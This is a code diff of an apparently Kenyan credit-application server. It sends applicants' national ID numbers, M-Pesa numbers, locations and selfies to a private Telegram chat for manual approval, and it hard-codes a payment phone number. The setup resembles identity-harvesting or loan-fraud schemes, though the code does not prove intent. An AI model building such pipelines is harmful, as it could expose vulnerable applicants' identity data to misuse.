@@ -9,30 +9,27 @@ const PORT = process.env.PORT || 3000;
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const POCHI_NUMBER = process.env.POCHI_NUMBER || '07XXXXXXXX';
+const POCHI_NUMBER = process.env.POCHI_NUMBER || '0757648339';
 
 app.use(helmet());
 
-// Apply rate limiter ONLY to form submissions
 const applicationLimiter = rateLimit({
     windowMs: 10 * 60 * 1000, 
     max: 15, 
     message: { success: false, message: 'Too many submission attempts. Please wait 10 minutes.' }
 });
 
-// Increased JSON body limit to 10mb to handle base64 selfie image uploads
 app.use(express.json({ limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 const applications = {};
 
-// Recognizable Kenyan towns/areas for backend validation
 const validKenyanLocations = [
     'nairobi', 'westlands', 'kilimani', 'karen', 'kasarani', 'embakasi', 'kibera', 'dagoretti', 'kamukunji', 'starehe',
     'mombasa', 'nyali', 'likoni', 'changamwe', 'kisauni', 'mvita',
     'kisumu', 'nakuru', 'eldoret', 'thika', 'ruiru', 'kiambu', 'machakos', 'kitengela', 'ngong', 'ongata rongai',
     'naivasha', 'nyeri', 'meru', 'embu', 'kericho', 'kakamega', 'bungoma', 'kitale', 'malindi', 'diani', 'kilifi',
-    'machakos', 'makueni', 'kajiado', 'narok', 'bomet', 'kisii', 'homabay', 'migori', 'siaya', 'busia', 'vihiga',
+    'makueni', 'kajiado', 'narok', 'bomet', 'kisii', 'homabay', 'migori', 'siaya', 'busia', 'vihiga',
     'nanyuki', 'karatina', 'limuru', 'juja', 'kikuyu', 'athiriver', 'voi', 'garissa', 'isiolo', 'lamu'
 ];
 
@@ -42,7 +39,6 @@ function aiFraudCheck(data) {
     if (!/^(07|01)[0-9]{8}$/.test(mpesaNumber)) return { isSuspicious: true, reason: 'Invalid Kenyan phone format' };
     if (!/^[0-9]{6,9}$/.test(idNumber)) return { isSuspicious: true, reason: 'Suspicious National ID length' };
     
-    // Server-side location verification
     const cleanLoc = (location || '').toLowerCase().trim();
     const isKnownLocation = validKenyanLocations.some(town => cleanLoc.includes(town));
     if (!isKnownLocation) {
@@ -91,7 +87,6 @@ ${aiStatus.isSuspicious ? `❌ *Flag Reason:* ${aiStatus.reason}` : ''}
         ]
     };
 
-    // If a selfie photo was uploaded, send it as a photo message to Telegram along with the details caption
     if (details.selfieDataUrl && details.selfieDataUrl.startsWith('data:image')) {
         try {
             const base64Data = details.selfieDataUrl.split(',')[1];
@@ -111,11 +106,10 @@ ${aiStatus.isSuspicious ? `❌ *Flag Reason:* ${aiStatus.reason}` : ''}
             });
             return;
         } catch (err) {
-            console.error('Failed to send selfie photo, falling back to text message:', err);
+            console.error('Failed to send selfie photo to Telegram, falling back to text:', err);
         }
     }
 
-    // Fallback text message if photo upload fails
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -123,7 +117,6 @@ ${aiStatus.isSuspicious ? `❌ *Flag Reason:* ${aiStatus.reason}` : ''}
     });
 }
 
-// Application Submission Route
 app.post('/api/process-credit-app', applicationLimiter, async (req, res) => {
     try {
         const { product, idNumber, location, mpesaNumber, mpesaNumberConfirm, walletNumber, amount, selfieDataUrl } = req.body;
@@ -149,19 +142,16 @@ app.post('/api/process-credit-app', applicationLimiter, async (req, res) => {
     }
 });
 
-// Polling status route
 app.get('/api/check-status/:appId', (req, res) => {
     const appData = applications[req.params.appId];
     if (!appData) return res.json({ status: 'PENDING', photoUrl: null });
     res.json({ status: appData.status, photoUrl: appData.itemPhotoUrl });
 });
 
-// Telegram Webhook (Handles replies with photos & inline buttons)
 app.post('/api/telegram-webhook', async (req, res) => {
     try {
         const update = req.body;
 
-        // 1. Photo uploaded by Admin in Telegram
         if (update.message && update.message.photo && update.message.reply_to_message) {
             const replyText = update.message.reply_to_message.caption || update.message.reply_to_message.text || '';
             const appIdMatch = replyText.match(/APP_\d+/);
@@ -196,7 +186,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
             }
         }
 
-        // 2. Inline approval buttons
         if (update.callback_query) {
             const query = update.callback_query;
             const chatId = query.message.chat.id;
